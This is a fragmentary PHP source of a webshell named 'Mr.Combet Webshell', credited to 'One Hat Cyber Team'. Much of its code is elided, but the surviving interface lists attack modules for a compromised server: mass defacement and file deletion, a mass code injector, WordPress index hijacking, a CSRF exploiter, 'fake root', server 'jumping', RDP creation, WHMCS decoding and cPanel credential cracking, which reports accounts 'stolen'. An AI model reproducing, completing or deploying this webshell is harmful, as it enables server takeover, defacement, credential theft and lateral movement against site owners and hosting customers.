...
?>
	...
	<head>
		...
		<link rel="icon" href="//png.pngitem.com/pimgs/s/555-5553234_anonymous-hacker-logo-2-by-jose-hacker-logo.png">
	...
	<body>
		...
		<div class="container">
			...
			<div class="y x">
				<a href="?" class="ajx">
					<font color="black">Mr.Combet Webshell</font>
				</a>
			</div>
			<nav class="navbar navbar-expand-lg navbar-light bg-light" style="padding: 0.3rem 0.3rem;border: 0.15rem solid black;border-radius: 0.5rem;">
...
{
    echo "<hr>
						<h2><center>Mass Tools</center></h2>
						<br>
						<center>
						<form method = 'POST'>
...
elseif (isset($_GET[hex('mass_tool') ]))
{
    ...
    else
    {
        echo "
		<hr><br>
		<center><h2>Mass Deface / Delete Files </h2><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
...
{
    echo "<hr><br><center><h2>Mass Title Changer</h2>
<form method='post'>
Link Config: <br>
...
{
    echo "<hr><br>";
    echo "<center><h2>Bypasser</h2></center><br>";
...
elseif (isset($_GET[hex('csrf') ]))
{
    ...
    echo '
<hr><br><center><h2 style="font-size:33px;">CSRF Exploiter</h2><br><br>
...
elseif (isset($_GET[hex('auto_tools') ]))
{
    ...
    echo '<hr><center><h2>Auto Tools</h2><br>
...
<tr>
    ...
    <td><a class = "form-control ajx" href = ?d=' . hex($d) . '&' . hex("rdp") . '><center>K-RDP</center></a></td>
</tr>
<tr>
...
elseif (isset($_GET[hex('jumping') ]))
{
    ...
    echo "<hr><br><center><h2>Jumping</h2>";
...
elseif (isset($_GET[hex('fake-root') ]))
{
    ...
    {
        echo "<hr><br><center><h2>Fake Root</h2><form method='post'>
...
<h2>Wordpress Hijack Index</h2><br>
<center>
...
{
    echo "<hr><br>";
    echo '<center><h2>Mass Code Injector</h2></center>';
...
elseif (isset($_GET[hex('cp-crack') ]))
{
    ...
    if ($_POST['crack'])
    {
        ...
        {
            echo "<br>sukses nyolong " . $i . " Cpanel by <font color=lime>Exc.</font>";
        }
    }
    else
    {
...
elseif (isset($_GET[hex('whmcs-decoder') ]))
{
    ...
    echo "
<hr><br>
<br><center><h2>Whmcs Decoder</h2></center>
...
';
    ...
    echo "<center>";
    echo '<hr><br>
<h2>CMS Vulnerability Scanner</h2>
...
?>
				...
				<footer class="x">
					<center>&copy; Author : One Hat Cyber Team</center>
				</footer>
				<?php
if (isset($_GET["1"]))
{
